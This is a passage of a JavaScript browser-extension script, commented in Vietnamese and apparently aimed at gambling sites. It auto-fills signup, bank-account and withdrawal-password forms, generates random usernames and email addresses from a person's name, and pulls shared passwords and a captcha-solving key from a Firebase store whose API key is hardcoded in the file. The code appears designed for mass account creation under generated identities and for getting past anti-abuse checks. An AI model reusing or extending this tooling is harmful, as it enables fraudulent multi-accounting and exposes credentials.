// ============================================================
// OKVIP TOOL — ALL-IN-ONE v6.17 + GROUP PICKER
// ============================================================

(function () {
  if (window.__MK_LOADED__) return;
  window.__MK_LOADED__ = true;

  // ===== KILL SWITCH BẢO MẬT =====
  // Nếu background.js đã phát hiện tool bị khóa từ xa (cờ okvip_kill_switch),
  // thì dừng toàn bộ luôn tại đây — không auto-fill, không chạy gì thêm.
  try {
    chrome.storage.local.get(['okvip_kill_switch'], function (result) {
      if (result && result.okvip_kill_switch === true) return; // bị khóa -> dừng hẳn
      __mk_boot__();
    });
  } catch (e) {
    __mk_boot__(); // không đọc được storage -> mặc định coi như chưa khóa
  }

  function __mk_boot__() {

  const MK = { state: {} };

  // ===== CHROME STORAGE POLYFILL =====
  if (typeof chrome === 'undefined' || !chrome.storage) {
    window.chrome = window.chrome || {};
    chrome.storage = {
      local: {
        get: function(keys, cb) {
          var result = {};
          var ks = Array.isArray(keys) ? keys : (typeof keys === 'string' ? [keys] : Object.keys(keys));
          ks.forEach(function(k) {
            try { var v = localStorage.getItem(k); result[k] = v ? JSON.parse(v) : undefined; } catch(e) { result[k] = localStorage.getItem(k); }
          });
          if (cb) cb(result);
          return Promise.resolve(result);
        },
        set: function(obj, cb) {
          Object.keys(obj).forEach(function(k) {
            try { localStorage.setItem(k, typeof obj[k] === 'object' ? JSON.stringify(obj[k]) : obj[k]); } catch(e) {}
          });
          if (cb) cb();
          return Promise.resolve();
        }
      }
    };
  }
  // ===== END POLYFILL =====

  // ===== CHROME.STORAGE.LOCAL HELPER + AUTO-MIGRATE =====
  // Dùng chung cho toàn extension (không phân biệt domain/iframe),
  // thay cho localStorage vốn bị cô lập theo từng domain.
  const CAPTCHA_KEY_STORE_NAME = "okvip_captcha_api_key";

  // ===== TỐC ĐỘ ĐIỀN (áp dụng cho tốc độ gõ ký tự vào ô input) =====
  const FILL_SPEED_KEY = "okvip_fill_speed";
  let FILL_SPEED = 1; // 1 = bình thường, càng cao càng nhanh
  try {
    const savedSpeed = parseFloat(localStorage.getItem(FILL_SPEED_KEY));
    if (savedSpeed && savedSpeed > 0) FILL_SPEED = savedSpeed;
  } catch(e) {}
  function setFillSpeed(v) {
    FILL_SPEED = v;
    try { localStorage.setItem(FILL_SPEED_KEY, String(v)); } catch(e) {}
    try { chrome.storage.local.set({ [FILL_SPEED_KEY]: v }); } catch(e) {}
  }
  function fspeedSleep(ms) { return sleep(Math.max(0, ms) / FILL_SPEED); }

  function mkStorageGet(key) {
    return new Promise((resolve) => {
      try {
        chrome.storage.local.get([key], (res) => {
          if (chrome.runtime && chrome.runtime.lastError) {
            // fallback nếu chrome.storage lỗi
            try { resolve(localStorage.getItem(key) || ""); } catch(e) { resolve(""); }
            return;
          }
          resolve(res && res[key] != null ? res[key] : "");
        });
      } catch(e) {
        try { resolve(localStorage.getItem(key) || ""); } catch(e2) { resolve(""); }
      }
    });
  }

  function mkStorageSet(key, value) {
    return new Promise((resolve) => {
      try {
        chrome.storage.local.set({ [key]: value }, () => resolve(true));
      } catch(e) {
        try { localStorage.setItem(key, value); } catch(e2) {}
        resolve(false);
      }
    });
  }

  // Migrate key cũ từ localStorage (đã set trước đây ở domain chính) sang
  // chrome.storage.local một lần duy nhất, để không phải nhập lại.
  (async function migrateCaptchaKeyOnce() {
    try {
      const already = await mkStorageGet(CAPTCHA_KEY_STORE_NAME);
      if (already) return; // đã có trong chrome.storage.local rồi, không cần migrate
      let oldVal = "";
      try { oldVal = localStorage.getItem(CAPTCHA_KEY_STORE_NAME) || ""; } catch(e) {}
      if (oldVal) {
        await mkStorageSet(CAPTCHA_KEY_STORE_NAME, oldVal);
        console.log('[MK] Đã migrate captcha API key sang chrome.storage.local');
      }
    } catch(e) { console.warn('[MK] Lỗi migrate captcha API key', e); }
  })();
  // ===== END CHROME.STORAGE.LOCAL HELPER =====

  // =====================================================
  // ========== PHẦN 1: BANK TOOL (Firebase) ==========
  // =====================================================

  function getPassword()         { return localStorage.getItem("okvip_password")          || ""; }
  function getWithdrawPassword() { return localStorage.getItem("okvip_withdraw_password") || ""; }

  const FIRESTORE_SETTINGS_URL = "https://firestore.googleapis.com/v1/projects/phoenix-e39b4/databases/(default)/documents/settings/apiKeys?key=AIzaSyA5qOQw0e-ool6kF68fpUXbvNtfSeVhFJ8";
  async function fetchRTDBSettings() {
    // 1. Firestore cũ (có password đầy đủ)
    try {
      const res = await fetch(FIRESTORE_SETTINGS_URL);
      if (res.ok) {
        const json = await res.json(); const f = json.fields || {};
        return {
          "okvip_api_key":           f.apiKey?.stringValue           || "",
          "okvip_captcha_api_key":   f.captchaApiKey?.stringValue    || "",
          "okvip_password":          f.password?.stringValue         || "",
          "okvip_withdraw_password": f.withdrawPassword?.stringValue || "",
          "okvip_tg_chatid":         f.tgChatId?.stringValue         || "",
        };
      }
    } catch(e) {}
    // 2. Fallback RTDB sv1111 /data.txt
    try {
      const raw = await (await fetch("https://sv1111-default-rtdb.firebaseio.com/data.txt.json")).json();
      if (typeof raw === 'string' && raw.trim()) return { "okvip_api_key": raw.trim() };
      if (raw && typeof raw === 'object') return {
        "okvip_api_key":           raw.apiKey            || "",
        "okvip_captcha_api_key":   raw.captchaApiKey     || "",
        "okvip_password":          raw.password          || "",
        "okvip_withdraw_password": raw.withdrawPassword  || "",
        "okvip_tg_chatid":         raw.tgChatId          || "",
      };
    } catch(e) {}
    return null;
  }
  (async function initFromRTDB() {
    try {
      // Ưu tiên chrome.storage (background đã set)
      const stored = await new Promise(res => chrome.storage.local.get(
        ["okvip_password","okvip_withdraw_password","okvip_api_key","okvip_captcha_api_key","okvip_tg_chatid"], res));
      Object.entries(stored).forEach(([k,v]) => { if(v) localStorage.setItem(k, v); });
    } catch(e) {}
    // Luôn fetch để đảm bảo mới nhất
    const s = await fetchRTDBSettings();
    if (s) Object.entries(s).forEach(([k,v]) => { if(v) { localStorage.setItem(k,v); try{chrome.storage.local.set({[k]:v});}catch(e){} } });
  })();
  // ===== END SYNC CONFIG =====

  const FIREBASE_CONFIG = {
    apiKey: "AIzaSyA5qOQw0e-ool6kF68fpUXbvNtfSeVhFJ8",
    projectId: "phoenix-e39b4"
  };
  const FIREBASE_CONFIG_NEW = {
    apiKey: "AIzaSyA5qOQw0e-ool6kF68fpUXbvNtfSeVhFJ8",
    projectId: "phoenix-e39b4",
    databaseURL: "https://phoenix-e39b4-default-rtdb.firebaseio.com"
  };

  async function getFirebaseConfig() {
    return FIREBASE_CONFIG;
  }

  const FIELD_KEYWORDS = {
    password: ["mật khẩu", "password", "mat khau", "pass"],
    withdraw: ["mật khẩu rút tiền", "mat khau rut tien", "xác nhận mật khẩu rút", "withdraw password", "rút tiền"],
    name:     ["họ và tên", "ho va ten", "họ tên", "full name", "tên thật", "ten that", "tên người", "họ tên thật"],
    stk:      ["số tài khoản ngân hàng", "so tai khoan ngan hang", "stk", "account number", "bank account", "số tk ngân hàng", "nhập số tài khoản"],
    username: ["tên tài khoản", "ten tai khoan", "username", "tài khoản", "tai khoan", "đăng nhập", "login", "nhập tên tài khoản", "account"],
    email:    ["email", "e-mail", "địa chỉ email", "dia chi email", "gmail"]
  };

  // ========== TỈNH THÀNH (fetch từ API) ==========
  let _provincesCache = null; // { p63: [...], p34: [...] }
  let _provincesFetching = null;

  async function fetchProvinces() {
    if (_provincesCache) return _provincesCache;
    if (_provincesFetching) return _provincesFetching;
    _provincesFetching = (async () => {
      // Ưu tiên đọc từ cache storage (background đã tải sẵn khi cài)
      try {
        const stored = await new Promise(res => chrome.storage.local.get(["okvip_provinces"], res));
        if (stored.okvip_provinces) {
          const json = JSON.parse(stored.okvip_provinces);
          if (json.p63 && json.p34) { _provincesCache = json; _provincesFetching = null; return _provincesCache; }
        }
      } catch(e) {}
      // Fallback: fetch trực tiếp nếu storage chưa có
      const res = await fetch("https://songcho.click/tinhthanh");
      const json = await res.json();
      _provincesCache = { p63: json.p63, p34: json.p34 };
      _provincesFetching = null;
      return _provincesCache;
    })();
    return _provincesFetching;
  }

  // Prefetch ngay khi script load — data sẵn sàng trước khi user click
  fetchProvinces().catch(() => {});

  function getCityInput() {
    const byFC = document.querySelector('input[formcontrolname="city"]');
    if (byFC) return byFC;
    const byPH = [...document.querySelectorAll('input')].find(el =>
      /thành phố|thanh pho|tỉnh thành|tinh thanh|city|province/i.test(el.placeholder||"")
    );
    if (byPH) return byPH;
    const KW = /city|province|tỉnh|tinh/i;
    return [...document.querySelectorAll('input')].find(el => {
      if (["hidden","checkbox","radio","submit","button","file","image"].includes((el.type||"text").toLowerCase())) return false;
      return KW.test(el.placeholder||"") || KW.test(el.name||"") ||
             KW.test(el.id||"") || KW.test(el.getAttribute("formcontrolname")||"") ||
             KW.test(el.getAttribute("aria-label")||"");
    }) || null;
  }

  // ========== NICK GEN ==========
  let _nickCache = null;
  let _nickFetching = null;
  let _nickRetryTimer = null;

  async function fetchNickConfig() {
    if (_nickCache) return _nickCache;
    if (_nickFetching) return _nickFetching;
    _nickFetching = (async () => {
      try {
        const res = await fetch("https://songcho.click/nick");
        const json = await res.json();
        if (!json.prefixes?.length || !json.suffixes?.length) throw new Error("Invalid nick config");
        _nickCache = { prefixes: json.prefixes, suffixes: json.suffixes };
        _nickFetching = null;
        if (_nickRetryTimer) { clearTimeout(_nickRetryTimer); _nickRetryTimer = null; }
        return _nickCache;
      } catch(e) {
        _nickFetching = null;
        _nickCache = null;
        if (!_nickRetryTimer) {
          _nickRetryTimer = setTimeout(() => { _nickRetryTimer = null; fetchNickConfig().catch(() => {}); }, 3000);
        }
        throw e;
      }
    })();
    return _nickFetching;
  }

  // Prefetch ngay khi script load, auto retry nếu fail
  fetchNickConfig().catch(() => {});

  function removeDiacritics(str) {
    return str.normalize("NFD").replace(/[̀-ͯ]/g,"").replace(/đ/g,"d").replace(/Đ/g,"D");
  }

  function parseName(fullName) {
    const parts = removeDiacritics(fullName).toLowerCase().trim().split(/\s+/);
    const first  = parts[parts.length - 1];
    const last   = parts[0];
    const middle = parts.length > 2 ? parts.slice(1, -1).join("") : "";
    return { first, last, middle, parts };
  }

  function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
  function randPad(n)   { return String(randInt(0,99)).padStart(n,"0"); }
  function randDDMM()   { const d=randInt(1,28),m=randInt(1,12); return String(d).padStart(2,"0")+String(m).padStart(2,"0"); }
  function pickRand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

  function sanitizeNick(val) {
    let s = val.replace(/[^a-z0-9]/gi, '');
    if(s.length < 2) s = s + String(randInt(10,99));
    if(s.length > 15) s = s.slice(0, 15);
    return s;
  }

  async function genNickOptions(fullName) {
    const { first, last, parts } = parseName(fullName);
    const cfg = await fetchNickConfig();
    const prefixes = cfg.prefixes;
    const suffixes = cfg.suffixes;
    const pre = pickRand(prefixes);
    const suf = pickRand(suffixes);
    const ddmm = randDDMM();
    const r2 = randPad(2);
    const r4 = String(randInt(1000,9999));
    const midInitials = parts.slice(1,-1).map(p=>p[0]).join("");

    return [
      { label: "Họ + tiền tố + 2 số",        value: sanitizeNick(`${last}${pre}${r2}`) },
      { label: "Tên + tiền tố",               value: sanitizeNick(`${first}${pre}`) },
      { label: "Họ + tên + 2 số",             value: sanitizeNick(`${last}${first}${r2}`) },
      { label: "Họ + ngày sinh (ddmm)",        value: sanitizeNick(`${last}${ddmm}`) },
      { label: "Tên + ngày sinh",             value: sanitizeNick(`${first}${ddmm}`) },
      { label: "Họ + tên + ngày sinh",        value: sanitizeNick(`${last}${first}${ddmm}`) },
      { label: "Họ + đệm viết tắt + tên",    value: sanitizeNick(`${last}${midInitials}${first}`) },
      { label: "Tiền tố + họ + tên",          value: sanitizeNick(`${pre}${last}${first}`) },
      { label: "Họ + tên + hậu tố",           value: sanitizeNick(`${last}${first}${suf}`) },
      { label: "Họ + 4 số",                   value: sanitizeNick(`${last}${r4}`) },
      { label: "Tên + 4 số",                  value: sanitizeNick(`${first}${r4}`) },
      { label: "Họ + tên + 4 số",             value: sanitizeNick(`${last}${first}${r4}`) },
      { label: "Chỉ họ + số",                 value: sanitizeNick(`${last}${r2}`) },
      { label: "Chỉ tên + số",                value: sanitizeNick(`${first}${r2}`) },
    ];
  }

  // ========== EMAIL GEN ==========
  let _emailCache = null;
  let _emailFetching = null;

  async function fetchEmailConfig() {
    if (_emailCache) return _emailCache;
    if (_emailFetching) return _emailFetching;
    _emailFetching = (async () => {
      // Ưu tiên đọc từ cache storage (background đã tải sẵn khi cài)
      try {
        const stored = await new Promise(res => chrome.storage.local.get(["okvip_email_config"], res));
        if (stored.okvip_email_config) {
          const json = JSON.parse(stored.okvip_email_config);
          if (json.domains && json.words) { _emailCache = json; _emailFetching = null; return _emailCache; }
        }
      } catch(e) {}
      // Fallback: fetch trực tiếp nếu storage chưa có
      const res = await fetch("https://songcho.click/email");
      const json = await res.json();
      _emailCache = { domains: json.domains, words: json.words };
      _emailFetching = null;
      return _emailCache;
    })();
    return _emailFetching;
  }

  // Prefetch ngay khi script load
  fetchEmailConfig().catch(() => {});

  async function genEmailOptions(fullName) {
    const { first, last } = parseName(fullName);
    const { domains, words } = await fetchEmailConfig();
    const w = pickRand(words);
    const r2 = randPad(2);
    const r4 = String(randInt(1000,9999));
    const ddmm = randDDMM();
    const dom = pickRand(domains);
    return [
      { label: "Họ + tên + 2 số",        value: `${last}${first}${r2}@${dom}` },
      { label: "Họ + tên + 4 số",        value: `${last}${first}${r4}@${dom}` },
      { label: "Tên + từ + 2 số",        value: `${first}${w}${r2}@${dom}` },
      { label: "Họ + từ + 4 số",         value: `${last}${w}${r4}@${dom}` },
      { label: "Họ + tên + ngày sinh",   value: `${last}${first}${ddmm}@${dom}` },
      { label: "Tên + ngày sinh",        value: `${first}${ddmm}@${dom}` },
      { label: "Họ + ngày sinh + 2 số",  value: `${last}${ddmm}${r2}@${dom}` },
      { label: "Họ + tên",               value: `${last}${first}@${dom}` },
    ];
  }

  function getEmailInput() {
    const byFC = document.querySelector('input[formcontrolname="email"], input[placeholder="Địa chỉ Email"], input[placeholder="Email"], input[placeholder="Nhập Email"], input[placeholder="Nhập email"]');
    if (byFC) return byFC;
    const byIdEmail = document.querySelector('#email');
    if (byIdEmail) return byIdEmail;
    const byNameEmail = document.querySelector("input[name='email']");
    if (byNameEmail) return byNameEmail;
    const byNgEmail = document.querySelector("input[ng-model='$ctrl.user.email.value']");
    if (byNgEmail) return byNgEmail;
    return findInputByKeywords(FIELD_KEYWORDS.email);
  }

  function getUsernameInput() {
    const byWFull = [...document.querySelectorAll('input[type="text"]')].find(el =>
      /nhập tên tài khoản|nhap ten tai khoan/i.test(el.placeholder||"") &&
      el.classList.contains("w-full") && !el.classList.contains("mx-auto")
    );
    if (byWFull) return byWFull;
    const byData = document.querySelector('input[data-input-name="account"], input[data-input-name="username"]');
    if (byData) return byData;
    const byPlayerId = document.querySelector('#playerid');
    if (byPlayerId) return byPlayerId;
    const byNameAttr = document.querySelector('input[name="username"]');
    if (byNameAttr) return byNameAttr;
    const byNgModel = document.querySelector("input[ng-model='$ctrl.user.account.value']");
    if (byNgModel) return byNgModel;
    const byFC = document.querySelector('input[formcontrolname="account"]');
    if (byFC) {
      const ph = byFC.placeholder || "";
      if (/tên|ten|username/i.test(ph)) return byFC;
      if (/2[-–]15|ký tự|ky tu|chữ cái|chu cai|gạch dưới|gach duoi/i.test(ph)) return byFC;
      if (/\d{6,}/.test(ph)) return null;
      return byFC;
    }
    const byPH = [...document.querySelectorAll('input')].find(el =>
      /tên người dùng|ten nguoi dung|nhập tên tài khoản|nhap ten tai khoan/i.test(el.placeholder||"")
    );
    if(byPH) return byPH;
    const bySpanLabel = [...document.querySelectorAll('input[type="text"]')].find(el => {
      const prev = el.closest('div,section,form,li')?.querySelector('span,label,p');
      return prev && /vui lòng nhập tên tài khoản|nhập tên tài khoản/i.test(prev.textContent||"");
    });
    if(bySpanLabel) return bySpanLabel;
    const foundUser = findInputByKeywords(FIELD_KEYWORDS.username);
    if (foundUser && /bankCard/i.test(foundUser.name || "")) return null;
    if (foundUser && foundUser.type === "password") return null;
    if (foundUser && document.querySelector('input[formcontrolname="newPassword"], input[formcontrolname="oldPassword"]')) return null;
    return foundUser;
  }

  async function showNickPicker(fullName, onSelect) {
    let currentOptions = await genNickOptions(fullName);

    const overlay = document.createElement("div");
    overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";

    const box = document.createElement("div");
    box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:380px;max-height:80vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
    box.innerHTML = `
      <div style="padding:12px 16px;background:#1a73e8;color:#fff;font-weight:700;font-size:14px;display:flex;justify-content:space-between;align-items:center;">
        🆔 Chọn Username
        <button id="__nk_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button>
      </div>
      <div style="padding:6px 12px;background:#e8f0fe;font-size:12px;color:#1a73e8;font-weight:600;">
        👤 <b>${fullName}</b>
      </div>
      <div id="__nk_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;"></div>
    `;
    overlay.appendChild(box);
    document.body.appendChild(overlay);

    function renderOptions(opts) {
      const listEl = box.querySelector("#__nk_list__");
      listEl.innerHTML = "";
      opts.forEach((o, idx) => {
        const row = document.createElement("div");
        row.style.cssText = "padding:8px 10px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;gap:8px;";
        row.innerHTML = `
          <div style="flex:1;min-width:0;">
            <div style="font-weight:700;font-size:13px;color:#111;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" id="__nk_val_${idx}__">${o.value}</div>
            <div style="font-size:10px;color:#999;margin-top:1px;">${o.label}</div>
          </div>
          <button data-idx="${idx}" class="__nk_pick__" style="padding:5px 10px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;flex-shrink:0;white-space:nowrap;">✅ Chọn</button>
          <button data-idx="${idx}" class="__nk_rand__" style="padding:5px 8px;background:#f0ad4e;color:#fff;border:none;border-radius:6px;font-size:13px;cursor:pointer;flex-shrink:0;">🎲</button>
        `;
        listEl.appendChild(row);
      });

      listEl.querySelectorAll(".__nk_pick__").forEach(btn => {
        btn.addEventListener("click", () => {
          const idx = parseInt(btn.dataset.idx);
          onSelect(currentOptions[idx].value);
          close();
        });
      });

      listEl.querySelectorAll(".__nk_rand__").forEach(btn => {
        btn.addEventListener("click", async () => {
          const idx = parseInt(btn.dataset.idx);
          const freshAll = await genNickOptions(fullName);
          currentOptions[idx] = freshAll[idx];
          const valEl = listEl.querySelector(`#__nk_val_${idx}__`);
          if (valEl) valEl.textContent = currentOptions[idx].value;
        });
      });
    }

    const close = () => overlay.remove();
    overlay.addEventListener("click", e => { if (e.target === overlay) close(); });
    box.querySelector("#__nk_close__").addEventListener("click", close);

    renderOptions(currentOptions);
  }

  function findInputByKeywords(keywords, type = null) {
    const allInputs = document.querySelectorAll("input");
    const matched = [];
    for (const input of allInputs) {
      const t = (input.type || "text").toLowerCase();
      if (["hidden","checkbox","radio","submit","button","file","image"].includes(t)) continue;
      if (type && t !== type) continue;
      const sources = [
        input.placeholder || "",
        input.getAttribute("aria-label") || "",
        input.name || "",
        input.id || "",
      ];
      if (input.id) {
        const label = document.querySelector(`label[for="${input.id}"]`);
        if (label) sources.push(label.textContent || "");
      }
      const parentLabel = input.closest("label");
      if (parentLabel) sources.push(parentLabel.textContent || "");
      const combined = sources.join(" ").toLowerCase();
      if (keywords.some(kw => combined.includes(kw.toLowerCase()))) matched.push(input);
    }
    return matched.find(el => el.getBoundingClientRect().width > 0) || matched[0] || null;
  }

  const WITHDRAW_FCNAMES = ["newPassword","confirm","newpassword","confirmpassword","oldPassword","oldpassword"];
  const CONFIRM_PW_NAMES = /pwdRepeat|pwrepeat|repassword|re_password|password_confirm|confirmpsw|confimpsw|confirm_password|passwordrepeat|repeatpassword|pwd2|pass2|password2/i;

  function isConfirmPasswordInput(el) {
    if (!el) return false;
    const name = el.name || "";
    const id = el.id || "";
    const ph = el.placeholder || "";
    const fc = el.getAttribute("formcontrolname") || "";
    if (CONFIRM_PW_NAMES.test(name) || CONFIRM_PW_NAMES.test(id) || CONFIRM_PW_NAMES.test(fc)) return true;
    if (/xác nhận mật khẩu|nhập lại mật khẩu|confirm.*pass|repeat.*pass|re-enter.*pass/i.test(ph)) return true;
    if (/confirm/i.test(name) && /pass|pwd|mk/i.test(name)) return true;
    return false;
  }

  function isWithdrawInput(el) {
    if (!el) return false;
    const fc = el.getAttribute("formcontrolname") || "";
    if (WITHDRAW_FCNAMES.includes(fc)) return true;
    const ph = el.placeholder || "";
    if (/mật khẩu rút|mat khau rut|xác nhận.*mật khẩu|withdraw/i.test(ph)) return true;
    const id = el.id || "";
    if (/pin|withdraw|rut/i.test(id)) return true;
    if (/confirm/i.test(id) && !/bank|account|stk/i.test(id)) return true;
    const container = el.closest('div, fieldset, label, section, li') || el.parentElement;
    if (container) {
      const spanPh = container.querySelector('span.input-placeholder, span[class*="placeholder"], label[class*="placeholder"]');
      if (spanPh && /mật khẩu rút|mat khau rut|xác nhận.*mật khẩu|withdraw/i.test(spanPh.textContent || "")) return true;
    }
    return false;
  }

  function getConfirmPasswordInput() {
    const byName = document.querySelector(
      "input[name='pwdRepeat'],input[name='confimpsw'],input[name='confirmPassword']," +
      "input[name='confirm_password'],input[name='repassword'],input[name='password2'],input[name='pwd2']"
    );
    if (byName) return byName;
    const byFC = document.querySelector("input[formcontrolname='confirmPassword'],input[formcontrolname='confirm']");
    if (byFC && !isWithdrawInput(byFC)) return byFC;
    return [...document.querySelectorAll('input[type="password"]')].find(el =>
      isConfirmPasswordInput(el) && !isWithdrawInput(el)
    ) || null;
  }

  function getPasswordInput() {
    const byDataPw = document.querySelector("input[data-input-name='userpass']");
    if (byDataPw && !isWithdrawInput(byDataPw)) return byDataPw;
    const byNgPw = document.querySelector("input[ng-model='$ctrl.user.password.value']");
    if (byNgPw && !isWithdrawInput(byNgPw)) return byNgPw;
    const byIdPw = document.querySelector('#password');
    if (byIdPw && !isWithdrawInput(byIdPw)) return byIdPw;
    const byNamePw = document.querySelector("input[name='password']");
    if (byNamePw && !isWithdrawInput(byNamePw)) return byNamePw;
    const all = [...document.querySelectorAll("input[type='password'], input[type='text']")];
    const pw = all.find(el => {
      if (isWithdrawInput(el)) return false;
      if (isConfirmPasswordInput(el)) return false;
      if (el.type === "password") return true;
      const sources = [el.placeholder||"", el.getAttribute("aria-label")||"", el.name||"", el.id||""].join(" ").toLowerCase();
      return FIELD_KEYWORDS.password.some(kw => sources.includes(kw.toLowerCase()));
    });
    return pw || null;
  }

  function getWithdrawInputs() {
    const byFC = [
      document.querySelector('input[formcontrolname="newPassword"]'),
      document.querySelector('input[formcontrolname="confirm"]'),
    ].filter(Boolean);
    if (byFC.length) return byFC;
    const byNgWd = [
      document.querySelector("input[ng-model='$ctrl.viewModel.moneyPasswordForm.newPassword.value']"),
      document.querySelector("input[ng-model='$ctrl.viewModel.moneyPasswordForm.confirmPassword.value']"),
      document.querySelector("input[ng-model='$ctrl.user.moneyPassword.value']"),
      document.querySelector("input[formcontrolname='moneyPassword']"),
    ].filter(Boolean);
    if (byNgWd.length) return byNgWd;
    const byPinId = [
      document.querySelector('#pin'),
      document.querySelector('#confirmpin'),
    ].filter(Boolean);
    if (byPinId.length) return byPinId;
    const byNameWd = [
      document.querySelector("input[name='withdraw']"),
      document.querySelector("input[name='withdrawT']"),
      document.querySelector(".ui-password-input__input"),
    ].filter(Boolean);
    if (byNameWd.length) return byNameWd;
    const byId = [...document.querySelectorAll('input[type="password"]')].filter(el =>
      /pin|withdraw|rut/i.test(el.id || "") || /confirm/i.test(el.id || "")
    );
    if (byId.length) return byId;
    const KW = /mật khẩu rút|mat khau rut|xác nhận.*mật khẩu rút|withdraw.*pass|mã pin|ma pin/i;
    const byPlaceholderAttr = [...document.querySelectorAll('input')].filter(el =>
      KW.test(el.placeholder || "") || KW.test(el.getAttribute("aria-label") || "")
    );
    if (byPlaceholderAttr.length) return byPlaceholderAttr;
    const bySpanPlaceholder = [...document.querySelectorAll('span.input-placeholder, span[class*="placeholder"], label[class*="placeholder"]')]
      .filter(span => KW.test(span.textContent || ""))
      .map(span => {
        const container = span.closest('div, fieldset, label, section, li') || span.parentElement;
        return container ? container.querySelector('input[type="password"], input[type="text"], input:not([type])') : null;
      })
      .filter(Boolean);
    return bySpanPlaceholder;
  }

  function clickEyeIcon(inputEl) {
    const container = inputEl.closest("fieldset, div, label, section") || inputEl.parentElement;
    if (!container) return;
    const eye = container.querySelector('i.fa-eye, i[class*="eye"], i[class*="icon-eye"]');
    if (eye) eye.click();
  }

  function getNameInput() {
    const byName = document.querySelector('input[name="payeeName"], input[name="realName"], input[name="fullName"], input[name="full_name"]');
    if(byName) return byName;
    const byFC = document.querySelector('input[formcontrolname="payeeName"], input[formcontrolname="realName"], input[formcontrolname="fullName"], input[formcontrolname="name"]');
    if(byFC) return byFC;
    const byFirstname = document.querySelector('#firstname');
    if(byFirstname) return byFirstname;
    const byDataReal = document.querySelector("input[data-input-name='realName']");
    if(byDataReal) return byDataReal;
    const byNgName = document.querySelector("input[ng-model='$ctrl.user.name.value']");
    if(byNgName) return byNgName;
    const EXCLUDE = /tên người dùng|ten nguoi dung|tên tài khoản|ten tai khoan|tên đăng nhập|ten dang nhap|đăng nhập|dang nhap|username|account|password|mật khẩu/i;
    const allInputs = document.querySelectorAll("input");
    for(const input of allInputs) {
      const t = (input.type||"text").toLowerCase();
      if(["hidden","checkbox","radio","submit","button","file","image","password"].includes(t)) continue;
      const sources = [
        input.placeholder||"", input.getAttribute("aria-label")||"",
        input.name||"", input.id||"",
        input.getAttribute("formcontrolname")||"",
      ];
      const combined = sources.join(" ").toLowerCase();
      if(EXCLUDE.test(combined)) continue;
      if(input.getAttribute("formcontrolname") === "account") continue;
      if(FIELD_KEYWORDS.name.some(kw => combined.includes(kw.toLowerCase()))) return input;
    }
    return null;
  }

  function getStkInput() {
    const byBankCard = document.querySelector('input[name="bankCard"]');
    if (byBankCard) return byBankCard;
    const byId = document.querySelector('input[id="bankaccount"], input[id="bankAccount"], input[id="bank_account"], input[id="BankAccount"]');
    if (byId) return byId;
    const byNgStk = document.querySelector("input[ng-model='$ctrl.viewModel.bankAccountForm.account.value']");
    if (byNgStk) return byNgStk;
    const byPH = document.querySelector("input[placeholder='Vui lòng nhập số tài khoản ngân hàng']");
    if (byPH) return byPH;
    const byFC = document.querySelector('input[formcontrolname="account"]');
    if (byFC) {
      const ph = byFC.placeholder || "";
      if (/\d{6,}/.test(ph)) return byFC;
    }
    return findInputByKeywords(FIELD_KEYWORDS.stk);
  }

  function getConfirmUsernameInput() {
    return [...document.querySelectorAll('input[type="text"]')].find(el =>
      (/nhập tên tài khoản|nhap ten tai khoan/i.test(el.placeholder||"") &&
      el.classList.contains("w-full") && el.classList.contains("mx-auto")) ||
      /nhập tài khoản|nhap tai khoan/i.test(el.placeholder||"")
    ) || null;
  }

  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
  function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

  async function bulkFillForm(data) {
    if (!data || data.length < 8) return;
    const [name, stk, _tag, city, username, password, withdrawPw, phone, email, birthday] = data;
    function setVal(el, val) {
      if (!el || !val) return;
      try {
        const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
        setter.call(el, val);
        ["input","change"].forEach(ev => el.dispatchEvent(new Event(ev, { bubbles: true })));
      } catch(e) {}
    }
    async function typeText(el, val) {
      if (!el || !val) return;
      if (el.value && el.value.trim()) return;
      await typeIntoInput(el, val);
      await fspeedSleep(40);
    }
    await typeText(document.querySelector("input[formcontrolname='city']"), city);
    await typeText(document.querySelector("input[formcontrolname='account']"), username);
    await typeText(document.querySelector("input[formcontrolname='password']"), password);
    await typeText(document.querySelector("input[formcontrolname='confirmPassword']"), password);
    await typeText(document.querySelector("input[formcontrolname='name']"), name);
    await typeText(document.querySelector("input[formcontrolname='mobile']"), phone);
    await typeText(document.querySelector("input[formcontrolname='email']"), email);
    await typeText(document.querySelector("input[formcontrolname='moneyPassword']"), withdrawPw);
    setVal(document.querySelector("input[formcontrolname='newPassword']"), withdrawPw);
    setVal(document.querySelector("input[formcontrolname='confirm']"), withdrawPw);
    await typeText(document.querySelector("input[ng-model='$ctrl.user.account.value']"), username);
    await typeText(document.querySelector("input[ng-model='$ctrl.user.password.value']"), password);
    await typeText(document.querySelector("input[ng-model='$ctrl.user.confirmPassword.value']"), password);
    await typeText(document.querySelector("input[ng-model='$ctrl.user.name.value']"), name);
    await typeText(document.querySelector("input[ng-model='$ctrl.user.mobile.value']"), phone);
    await typeText(document.querySelector("input[ng-model='$ctrl.user.email.value']"), email);
    await typeText(document.querySelector("input[ng-model='$ctrl.user.moneyPassword.value']"), withdrawPw);
    setVal(document.querySelector("input[ng-model='$ctrl.viewModel.moneyPasswordForm.newPassword.value']"), withdrawPw);
    setVal(document.querySelector("input[ng-model='$ctrl.viewModel.moneyPasswordForm.confirmPassword.value']"), withdrawPw);
    await typeText(document.querySelector("input[ng-model='$ctrl.viewModel.bankAccountForm.city.value']"), city);
    await typeText(document.querySelector("input[ng-model='$ctrl.viewModel.bankAccountForm.account.value']"), stk);
    await typeText(document.querySelector("#playerid"), username);
    await typeText(document.querySelector("#password"), password);
    await typeText(document.querySelector("#bankbranch"), city);
    await typeText(document.querySelector("#bankaccount"), stk);
